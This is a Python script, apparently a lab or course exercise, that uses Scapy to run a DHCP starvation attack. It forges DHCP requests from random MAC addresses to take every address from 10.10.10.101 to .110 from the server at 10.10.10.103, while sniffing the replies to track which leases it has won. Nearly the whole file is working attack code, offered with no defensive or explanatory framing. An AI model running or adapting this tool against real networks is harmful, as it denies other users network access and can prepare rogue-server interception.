
from scapy.all import *
from time import sleep
from threading import Thread
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether


class DHCPStarvation(object):
    def __init__(self):
        self.mac = set()
        self.ip = set()

    def choose_intf(self):
        interfaces = get_if_list()
        for i, interface in enumerate(interfaces):
            print(f'{i}: {interface}')

        while True:
            try:
                user_choice = int(input('Choose the interface number from the list above: '))
                if 0 <= user_choice < len(interfaces):
                    return interfaces[user_choice]
                else:
                    print('Invalid choice. Try again.')
            except ValueError:
                print('Invalid input. Try again.')

    def handle_dhcp(self, pkt):
        if pkt[DHCP]:
            if pkt[DHCP].options[0][1] == 5 and pkt[IP].dst != "10.10.10.103":
                self.ip.add(pkt[IP].dst)
                print(str(pkt[IP].dst) + " registered")
            elif pkt[DHCP].options[0][1] == 6:
                print("NAK received")

    def listen(self):
        sniff(filter="udp and (port 67 or port 68)", prn=self.handle_dhcp, store=0)

    def start(self):
        self.outgoing_intf = self.choose_intf()
        thread = Thread(target=self.listen)
        thread.start()
        print("Starting DHCP starvation...")
        while len(self.ip) < 10:  # We are targeting the range 10.10.10.101 - 10.10.10.110
            self.starve()
        print("Targeted IP address starved")

    def starve(self):
        for i in range(101, 111):
            requested_addr = "10.10.10." + str(i)
            print('Requesting', requested_addr)
            if requested_addr in self.ip:
                continue
            src_mac = str(RandMAC())
            while src_mac in self.mac:
                src_mac = str(RandMAC())
            self.mac.add(src_mac)
            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
            pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
            pkt /= UDP(sport=68, dport=67)
            pkt /= BOOTP(chaddr=RandMAC())
            pkt /= DHCP(options=[("message-type", "request"),
                                 ("requested_addr", requested_addr),
                                 ("server_id", "10.10.10.103"),
                                 "end"])
            sendp(pkt, iface=self.outgoing_intf)
            print("Trying to occupy " + requested_addr)
            sleep(0.2)


if __name__ == "__main__":
    starvation = DHCPStarvation()
    starvation.start()
